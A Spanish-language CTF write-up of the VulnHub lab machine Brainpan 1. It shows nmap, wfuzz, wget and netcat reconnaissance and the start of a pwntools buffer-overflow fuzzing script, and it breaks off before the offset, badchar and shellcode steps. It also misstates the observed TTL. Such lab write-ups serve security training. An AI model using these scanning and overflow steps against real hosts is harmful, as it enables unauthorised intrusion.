href=/writeups/tryhackme/bounty-hacker/><img src=/writeups/tryhackme/bounty-hacker//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Bounty Hacker</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/wonderland/><img src=/writeups/tryhackme/wonderland//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Wonderland</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/mustacchio/><img src=/writeups/tryhackme/mustacchio//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Mustacchio</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/source/><img src=/writeups/tryhackme/source//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Source</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/startup/><img src=/writeups/tryhackme/startup//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Startup</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/team/><img src=/writeups/tryhackme/team//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Team</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/chill-hack/><img src=/writeups/tryhackme/chill-hack//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Chill Hack</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/blue/><img src=/writeups/tryhackme/blue//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Blue</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-899f9e1034ad8d41a30f4792e02699a8 aria-expanded=false>
HackMyVm</button><div class=collapse id=section-899f9e1034ad8d41a30f4792e02699a8><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackmyvm/jabita/>Jabita</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackmyvm/w140-video/>W140 (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackmyvm/uvalde-video/>Uvalde (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackmyvm/friendly-i-video/>Friendly I (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackmyvm/jabita-video/>Jabita (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackmyvm/literal-video/>Literal (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackmyvm/doc-video/>Doc (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackmyvm/five-video/>Five (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackmyvm/friendly-ii-video/>Friendly II (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackmyvm/visions-video/>Visions (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackmyvm/friendly-iii-video/>Friendly III (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackmyvm/liceo/>Liceo</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-ccdabd144af006c40e0937d3f87d7afa aria-expanded=true>
VulnHub</button><div class="collapse show" id=section-ccdabd144af006c40e0937d3f87d7afa><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded active" href=/writeups/vulnhub/brainpan-1/>Brainpan 1</a></li></ul></div></li></ul></nav></div><nav class="docs-toc docs-toc-offset d-none d-xl-block col-xl-3" aria-label="Secondary navigation"><div class=page-links><h3>On this page</h3><nav id=toc><ul><li><ul><li><a href=#reconocimiento>Reconocimiento</a><ul><li><a href=#escaneo-de-puertos>Escaneo de puertos</a></li><li><a href=#puerto-10000>Puerto 10000</a></li><li><a href=#puerto-9999>Puerto 9999</a></li></ul></li><li><a href=#buffer-overflow>Buffer Overflow</a><ul><li><a href=#calcular-offset>Calcular Offset</a></li><li><a href=#buscar-badchars>Buscar badchars</a></li><li><a href=#protecciones>Protecciones</a></li><li><a href=#jmp-esp>JMP ESP</a></li><li><a href=#shellcode>Shellcode</a></li></ul></li><li><a href=#escalada-de-privilegios>Escalada de privilegios</a></li></ul></li></ul></nav></div></nav><main class="docs-content col-lg-11 col-xl-9"><nav aria-label=breadcrumb><ol class=breadcrumb><li class=breadcrumb-item><a href=/>Home</a></li><li class=breadcrumb-item><a href=/writeups/>Writeups</a></li><li class=breadcrumb-item><a href=/writeups/vulnhub/>VulnHub</a></li><li class="breadcrumb-item active" aria-current=page>Brainpan 1</li></ol></nav><div style=display:flex;align-items:center><div style="border-left:8px solid #e91414;height:40px;margin-right:10px"></div><h1 style=margin:0;vertical-align:middle>Brainpan 1</h1></div><nav class="toc-mobile d-xl-none" aria-label="Quaternary navigation"><details><summary>On this page</summary><div class=page-links><nav id=TableOfContents><ul><li><ul><li><a href=#reconocimiento>Reconocimiento</a><ul><li><a href=#escaneo-de-puertos>Escaneo de puertos</a></li><li><a href=#puerto-10000>Puerto 10000</a></li><li><a href=#puerto-9999>Puerto 9999</a></li></ul></li><li><a href=#buffer-overflow>Buffer Overflow</a><ul><li><a href=#calcular-offset>Calcular Offset</a></li><li><a href=#buscar-badchars>Buscar badchars</a></li><li><a href=#protecciones>Protecciones</a></li><li><a href=#jmp-esp>JMP ESP</a></li><li><a href=#shellcode>Shellcode</a></li></ul></li><li><a href=#escalada-de-privilegios>Escalada de privilegios</a></li></ul></li></ul></nav></div></details></nav><div class=tag-list-single><a class="btn btn-light" href=/tags/ctf/ role=button>CTF</a>
<a class="btn btn-light" href=/tags/bof/ role=button>BoF</a></div><div style=display:flex;align-items:center;vertical-align:middle><img src=/blog/phishing/images/pingu2.png alt style=width:40px;height:40px;margin-right:10px;vertical-align:middle>
<img src=/blog/phishing/images/vulnhub.png alt style=width:40px;height:40px;margin-right:10px;vertical-align:middle></div><br><p>En esta máquina vamos a practicar el BoF (Buffer Overflow) más típico que suele caer en certificaciones como el eCPPT o el antiguo OSCP</p><p><small>February 9, 2024<span class="stretched-link position-relative reading-time" title="Estimated reading time"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 12a9 9 0 1018 0A9 9 0 003 12"/><path d="M12 7v5l3 3"/></svg>14&nbsp;minutes</span></small></p><h2 id=reconocimiento>Reconocimiento<a href=#reconocimiento class=anchor aria-hidden=true>#</a></h2><p>Para empezar lo primero es comprobar si la máquina está activa y que OS tiene</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; ping -c <span class=m>1</span> 192.168.1.139
</span></span><span class=line><span class=cl>PING 192.168.1.139 <span class=o>(</span>192.168.1.139<span class=o>)</span> 56<span class=o>(</span>84<span class=o>)</span> bytes of data.
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 192.168.1.139: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>1</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>64</span> <span class=nv>time</span><span class=o>=</span>0.240 ms
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>--- 192.168.1.139 ping statistics ---
</span></span><span class=line><span class=cl><span class=m>1</span> packets transmitted, <span class=m>1</span> received, 0% packet loss, <span class=nb>time</span> 0ms
</span></span><span class=line><span class=cl>rtt min/avg/max/mdev <span class=o>=</span> 0.240/0.240/0.240/0.000 ms
</span></span></code></pre></div><p>Tenemos conexión y en este caso da un ttl (time to live) de <strong>127</strong>, entendiendo que <strong>ttl=64: Linux</strong> / <strong>ttl=128: Windows</strong>. Esta máquina es <strong>Linux</strong></p><h3 id=escaneo-de-puertos>Escaneo de puertos<a href=#escaneo-de-puertos class=anchor aria-hidden=true>#</a></h3><p>Ahora empezamos con un escaneo de puertos</p><pre tabindex=0><code>$ sudo nmap -p- --open -sS --min-rate 5000 -vvv -Pn -n 192.168.1.139 -oG allPorts
</code></pre><details><summary>Explicación parámetros</summary><table><thead><tr><th>Parámetro</th><th>Función</th></tr></thead><tbody><tr><td>-p-</td><td>Para que el escaneo sea a todos los puertos (65536)</td></tr><tr><td>&ndash;open</td><td>Para que solo reporte los puertos abiertos</td></tr><tr><td>&ndash;min-rate 5000</td><td>Definir el tiempo del escaneo</td></tr><tr><td>-n</td><td>Omitir resolución DNS</td></tr><tr><td>-vvv</td><td>Para que vaya reportando lo que encuentre por consola</td></tr><tr><td>-Pn</td><td>Para saltar la comprobación de sí la máquina está activa o no</td></tr><tr><td>-oG allPorts</td><td>Para que guarde el escaneo en format grepeable en un archivo llamado allPort</td></tr></tbody></table></details><br><p>Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual</p><p><a href=https://pastebin.com/tYpwpauW>Función extractPorts</a> de <a href=https://s4vitar.github.io>@s4vitar</a></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; extractPorts allPorts
</span></span><span class=line><span class=cl>───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────
</span></span><span class=line><span class=cl>       │ File: extractPorts.tmp
</span></span><span class=line><span class=cl>───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────
</span></span><span class=line><span class=cl>   <span class=m>1</span>   │ 
</span></span><span class=line><span class=cl>   <span class=m>2</span>   │ <span class=o>[</span>*<span class=o>]</span> Extracting information...
</span></span><span class=line><span class=cl>   <span class=m>3</span>   │ 
</span></span><span class=line><span class=cl>   <span class=m>4</span>   │     <span class=o>[</span>*<span class=o>]</span> IP Address: 192.168.1.139
</span></span><span class=line><span class=cl>   <span class=m>5</span>   │     <span class=o>[</span>*<span class=o>]</span> Open ports: 9999,10000
</span></span><span class=line><span class=cl>   <span class=m>6</span>   │ 
</span></span><span class=line><span class=cl>   <span class=m>7</span>   │ <span class=o>[</span>*<span class=o>]</span> Ports copied to clipboard
</span></span><span class=line><span class=cl>   <span class=m>8</span>   │ 
</span></span><span class=line><span class=cl>───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────
</span></span></code></pre></div><p>Ahora con nmap vamos a intentar buscar las versiones de los servicios que corren por los puertos y ejecutar scripts básicos de reconocimientos de nmap</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; sudo nmap -p9999,10000 -sCV 192.168.1.139 -oN versions
</span></span><span class=line><span class=cl>Starting Nmap 7.94SVN <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2024-02-04 18:42 CET
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 192.168.1.139
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.00053s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT      STATE SERVICE VERSION
</span></span><span class=line><span class=cl>9999/tcp  open  abyss?
</span></span><span class=line><span class=cl><span class=p>|</span> fingerprint-strings: 
</span></span><span class=line><span class=cl><span class=p>|</span>   NULL: 
</span></span><span class=line><span class=cl><span class=p>|</span>     _<span class=p>|</span> _<span class=p>|</span> 
</span></span><span class=line><span class=cl><span class=p>|</span>     _<span class=p>|</span>_<span class=p>|</span>_<span class=p>|</span> _<span class=p>|</span> _<span class=p>|</span>_<span class=p>|</span> _<span class=p>|</span>_<span class=p>|</span>_<span class=p>|</span> _<span class=p>|</span>_<span class=p>|</span>_<span class=p>|</span> _<span class=p>|</span>_<span class=p>|</span>_<span class=p>|</span> _<span class=p>|</span>_<span class=p>|</span>_<span class=p>|</span> _<span class=p>|</span>_<span class=p>|</span>_<span class=p>|</span> 
</span></span><span class=line><span class=cl><span class=p>|</span>     _<span class=p>|</span>_<span class=p>|</span> _<span class=p>|</span> _<span class=p>|</span> _<span class=p>|</span> _<span class=p>|</span> _<span class=p>|</span> _<span class=p>|</span> _<span class=p>|</span> _<span class=p>|</span> _<span class=p>|</span> _<span class=p>|</span> _<span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     _<span class=p>|</span>_<span class=p>|</span>_<span class=p>|</span> _<span class=p>|</span> _<span class=p>|</span>_<span class=p>|</span>_<span class=p>|</span> _<span class=p>|</span> _<span class=p>|</span> _<span class=p>|</span> _<span class=p>|</span>_<span class=p>|</span>_<span class=p>|</span> _<span class=p>|</span>_<span class=p>|</span>_<span class=p>|</span> _<span class=p>|</span> _<span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=o>[</span>________________________ WELCOME TO BRAINPAN _________________________<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_    ENTER THE PASSWORD
</span></span><span class=line><span class=cl>10000/tcp open  http    SimpleHTTPServer 0.6 <span class=o>(</span>Python 2.7.3<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: SimpleHTTP/0.6 Python/2.7.3
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Site doesn<span class=err>&#39;</span>t have a title <span class=o>(</span>text/html<span class=o>)</span>.
</span></span><span class=line><span class=cl><span class=m>1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span class=line><span class=cl>SF-Port9999-TCP:V<span class=o>=</span>7.94SVN%I<span class=o>=</span>7%D<span class=o>=</span>2/4%Time<span class=o>=</span>65BFCC92%P<span class=o>=</span>x86_64-pc-linux-gnu%r<span class=o>(</span>
</span></span><span class=line><span class=cl>SF:NULL,298,<span class=s2>&#34;_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
</span></span></span><span class=line><span class=cl><span class=s2>SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x
</span></span></span><span class=line><span class=cl><span class=s2>SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
</span></span></span><span class=line><span class=cl><span class=s2>SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
</span></span></span><span class=line><span class=cl><span class=s2>SF:\x20\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\|_
</span></span></span><span class=line><span class=cl><span class=s2>SF:\|\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\x2
</span></span></span><span class=line><span class=cl><span class=s2>SF:0\x20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_\|
</span></span></span><span class=line><span class=cl><span class=s2>SF:\x20\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|
</span></span></span><span class=line><span class=cl><span class=s2>SF:\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|
</span></span></span><span class=line><span class=cl><span class=s2>SF:\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x20_
</span></span></span><span class=line><span class=cl><span class=s2>SF:\|\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20
</span></span></span><span class=line><span class=cl><span class=s2>SF:\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20
</span></span></span><span class=line><span class=cl><span class=s2>SF:\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x20
</span></span></span><span class=line><span class=cl><span class=s2>SF:\x20\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x2
</span></span></span><span class=line><span class=cl><span class=s2>SF:0_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|_\|\x20\x20\x20\x20\x20
</span></span></span><span class=line><span class=cl><span class=s2>SF:\x20_\|_\|_\|\x20\x20_\|\x20\x20\x20\x20_\|\n\x20\x20\x20\x20\x20\x20\x
</span></span></span><span class=line><span class=cl><span class=s2>SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
</span></span></span><span class=line><span class=cl><span class=s2>SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
</span></span></span><span class=line><span class=cl><span class=s2>SF:\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
</span></span></span><span class=line><span class=cl><span class=s2>SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\
</span></span></span><span class=line><span class=cl><span class=s2>SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
</span></span></span><span class=line><span class=cl><span class=s2>SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
</span></span></span><span class=line><span class=cl><span class=s2>SF:0\x20\x20_\|\n\n\[________________________\x20WELCOME\x20TO\x20BRAINPAN
</span></span></span><span class=line><span class=cl><span class=s2>SF:\x20_________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
</span></span></span><span class=line><span class=cl><span class=s2>SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ENTER
</span></span></span><span class=line><span class=cl><span class=s2>SF:\x20THE\x20PASSWORD\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
</span></span></span><span class=line><span class=cl><span class=s2>SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\
</span></span></span><span class=line><span class=cl><span class=s2>SF:n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
</span></span></span><span class=line><span class=cl><span class=s2>SF:20\x20\x20\x20\x20\x20\x20\x20\x20&gt;&gt;\x20&#34;</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>MAC Address: 08:00:27:C3:40:1B <span class=o>(</span>Oracle VirtualBox virtual NIC<span class=o>)</span>
</span></span></code></pre></div><details><summary>Explicación parámetros</summary><table><thead><tr><th style=text-align:center>Parámetro</th><th>Función</th></tr></thead><tbody><tr><td style=text-align:center>-p</td><td>Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior</td></tr><tr><td style=text-align:center>-sC</td><td>Para que realice scripts básicos de reconocimiento</td></tr><tr><td style=text-align:center>-sV</td><td>Proporciona la versión e información de los servicios que corren por los puertos</td></tr></tbody></table></details><br><h3 id=puerto-10000>Puerto 10000<a href=#puerto-10000 class=anchor aria-hidden=true>#</a></h3><p>Nmap ha reportado que por el puerto 10000 hay un <strong>SimpleHTTPServer</strong> de versión <strong>0.6 (Python 2.7.3)</strong>. Esto también lo podríamos haber visto con whatweb</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ whatweb 192.168.1.139:10000
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>http://192.168.1.139:10000 <span class=o>[</span><span class=m>200</span> OK<span class=o>]</span> Country<span class=o>[</span>RESERVED<span class=o>][</span>ZZ<span class=o>]</span>, HTTPServer<span class=o>[</span>SimpleHTTP/0.6 Python/2.7.3<span class=o>]</span>, IP<span class=o>[</span>192.168.1.139<span class=o>]</span>, Python<span class=o>[</span>2.7.3<span class=o>]</span>
</span></span></code></pre></div><p>Al entrar a la web vemos una página simple sin nada destacable. En este punto podríamos tratar de hacer fuzzing para enumerar archivos o directorios dentro del servidor web. Para ello vamos a usar la herramienta wfuzz</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; wfuzz -c -t <span class=m>20</span> --hc<span class=o>=</span><span class=m>404</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://192.168.1.139:10000/FUZZ
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>=====================================================================</span>
</span></span><span class=line><span class=cl>ID           Response   Lines    Word       Chars       <span class=nv>Payload</span>                                                                                                                                                
</span></span><span class=line><span class=cl><span class=o>=====================================================================</span>                                                                                 
</span></span><span class=line><span class=cl>000000483:   <span class=m>301</span>        <span class=m>0</span> L      <span class=m>0</span> W        <span class=m>0</span> Ch        <span class=s2>&#34;bin&#34;</span>  
</span></span></code></pre></div><details><summary>Explicación parámetros</summary><ul><li>-c: Mostrar el resultado con colores</li><li>-t: Definir el tiempo del escaneo</li><li>&ndash;hc=404: Con esto le decimos que no nos interesan las respuestas cuyo código de estado sea 404, lo que significa que no queremos que nos reporte páginas que no existen</li><li>-w: Diccionario</li><li>FUZZ: Es donde va a ir probando el contenido del diccionario</li></ul></details><br><p>Ha encontrado un directorio llamado bin en el cual dentro hay un archivo llamado brainpan.exe, vamos a descargárnoslo</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ wget 192.168.1.139:10000/bin/brainpan.exe
</span></span><span class=line><span class=cl>     
</span></span><span class=line><span class=cl>2024-02-04 18:57:28 <span class=o>(</span>44.7 MB/s<span class=o>)</span> - ‘brainpan.exe’ saved <span class=o>[</span>21190/21190<span class=o>]</span>
</span></span></code></pre></div><p>Vamos a pasarnos este binario a una máquina windows 7, en mi caso de 32 bits, mediante un servidor de python creado desde la máquina atacante con <code>python3 -m http.server 80</code>. Ahora desde el navegador de windows 7 si ponemos nuestra ip ya nos podremos bajar el archivo.</p><h3 id=puerto-9999>Puerto 9999<a href=#puerto-9999 class=anchor aria-hidden=true>#</a></h3><p>Al ejecutar el brainpan.exe desde la máquina windows, se abre una terminal en la cual pone &ldquo;bind done on port 9999 waitin for connextions&rdquo; Casualmente es el mismo puerto que tenía abierto la máquina víctima.</p><p>Si probamos de conectarnos con netcat por el puerto 9999 a la máquina windows y después nos conectamos a la máquina víctima por el puerto 9999 vemos que el mensaje es el mismo.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; nc 192.168.1.141 <span class=m>9999</span> <span class=c1>#Windows 7</span>
</span></span><span class=line><span class=cl>_<span class=p>|</span>                            _<span class=p>|</span>                                        
</span></span><span class=line><span class=cl>_<span class=p>|</span>_<span class=p>|</span>_<span class=p>|</span>    _<span class=p>|</span>  _<span class=p>|</span>_<span class=p>|</span>    _<span class=p>|</span>_<span class=p>|</span>_<span class=p>|</span>      _<span class=p>|</span>_<span class=p>|</span>_<span class=p>|</span>    _<span class=p>|</span>_<span class=p>|</span>_<span class=p>|</span>      _<span class=p>|</span>_<span class=p>|</span>_<span class=p>|</span>  _<span class=p>|</span>_<span class=p>|</span>_<span class=p>|</span>  
</span></span><span class=line><span class=cl>_<span class=p>|</span>    _<span class=p>|</span>  _<span class=p>|</span>_<span class=p>|</span>      _<span class=p>|</span>    _<span class=p>|</span>  _<span class=p>|</span>  _<span class=p>|</span>    _<span class=p>|</span>  _<span class=p>|</span>    _<span class=p>|</span>  _<span class=p>|</span>    _<span class=p>|</span>  _<span class=p>|</span>    _<span class=p>|</span>
</span></span><span class=line><span class=cl>_<span class=p>|</span>    _<span class=p>|</span>  _<span class=p>|</span>        _<span class=p>|</span>    _<span class=p>|</span>  _<span class=p>|</span>  _<span class=p>|</span>    _<span class=p>|</span>  _<span class=p>|</span>    _<span class=p>|</span>  _<span class=p>|</span>    _<span class=p>|</span>  _<span class=p>|</span>    _<span class=p>|</span>
</span></span><span class=line><span class=cl>_<span class=p>|</span>_<span class=p>|</span>_<span class=p>|</span>    _<span class=p>|</span>          _<span class=p>|</span>_<span class=p>|</span>_<span class=p>|</span>  _<span class=p>|</span>  _<span class=p>|</span>    _<span class=p>|</span>  _<span class=p>|</span>_<span class=p>|</span>_<span class=p>|</span>      _<span class=p>|</span>_<span class=p>|</span>_<span class=p>|</span>  _<span class=p>|</span>    _<span class=p>|</span>
</span></span><span class=line><span class=cl>                                            _<span class=p>|</span>                          
</span></span><span class=line><span class=cl>                                            _<span class=p>|</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>________________________ WELCOME TO BRAINPAN _________________________<span class=o>]</span>
</span></span><span class=line><span class=cl>                          ENTER THE PASSWORD                              
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                          &gt;&gt;
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; nc 192.168.1.139 <span class=m>9999</span> <span class=c1>#Víctima</span>
</span></span><span class=line><span class=cl>_<span class=p>|</span>                            _<span class=p>|</span>                                        
</span></span><span class=line><span class=cl>_<span class=p>|</span>_<span class=p>|</span>_<span class=p>|</span>    _<span class=p>|</span>  _<span class=p>|</span>_<span class=p>|</span>    _<span class=p>|</span>_<span class=p>|</span>_<span class=p>|</span>      _<span class=p>|</span>_<span class=p>|</span>_<span class=p>|</span>    _<span class=p>|</span>_<span class=p>|</span>_<span class=p>|</span>      _<span class=p>|</span>_<span class=p>|</span>_<span class=p>|</span>  _<span class=p>|</span>_<span class=p>|</span>_<span class=p>|</span>  
</span></span><span class=line><span class=cl>_<span class=p>|</span>    _<span class=p>|</span>  _<span class=p>|</span>_<span class=p>|</span>      _<span class=p>|</span>    _<span class=p>|</span>  _<span class=p>|</span>  _<span class=p>|</span>    _<span class=p>|</span>  _<span class=p>|</span>    _<span class=p>|</span>  _<span class=p>|</span>    _<span class=p>|</span>  _<span class=p>|</span>    _<span class=p>|</span>
</span></span><span class=line><span class=cl>_<span class=p>|</span>    _<span class=p>|</span>  _<span class=p>|</span>        _<span class=p>|</span>    _<span class=p>|</span>  _<span class=p>|</span>  _<span class=p>|</span>    _<span class=p>|</span>  _<span class=p>|</span>    _<span class=p>|</span>  _<span class=p>|</span>    _<span class=p>|</span>  _<span class=p>|</span>    _<span class=p>|</span>
</span></span><span class=line><span class=cl>_<span class=p>|</span>_<span class=p>|</span>_<span class=p>|</span>    _<span class=p>|</span>          _<span class=p>|</span>_<span class=p>|</span>_<span class=p>|</span>  _<span class=p>|</span>  _<span class=p>|</span>    _<span class=p>|</span>  _<span class=p>|</span>_<span class=p>|</span>_<span class=p>|</span>      _<span class=p>|</span>_<span class=p>|</span>_<span class=p>|</span>  _<span class=p>|</span>    _<span class=p>|</span>
</span></span><span class=line><span class=cl>                                            _<span class=p>|</span>                          
</span></span><span class=line><span class=cl>                                            _<span class=p>|</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>________________________ WELCOME TO BRAINPAN _________________________<span class=o>]</span>
</span></span><span class=line><span class=cl>                          ENTER THE PASSWORD                              
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                          &gt;&gt;
</span></span></code></pre></div><p>Con esto sacamos la conclusión de que el archivo brainpan.exe es el mismo que se está ejecutando en la máquina víctima</p><h2 id=buffer-overflow>Buffer Overflow<a href=#buffer-overflow class=anchor aria-hidden=true>#</a></h2><p>Para analizar el binario usaremos Inmunnity Debugger con mona.</p><p>Primero importamos el archivo en Imunity Debugger. Una vez importado lo ejecutamos desde inmunity debugger.</p><p>Durante la explotación vamos a ir desarrollando un script en python para agilizarlo todo&mldr;</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>offset</span> <span class=o>=</span> <span class=mi>1000</span>
</span></span><span class=line><span class=cl><span class=n>junk</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span> <span class=o>*</span> <span class=n>offset</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>junk</span>
</span></span><span class=line><span class=cl><span class=n>host</span><span class=p>,</span> <span class=n>port</span> <span class=o>=</span> <span class=s2>&#34;192.168.1.141&#34;</span><span class=p>,</span> <span class=mi>9999</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
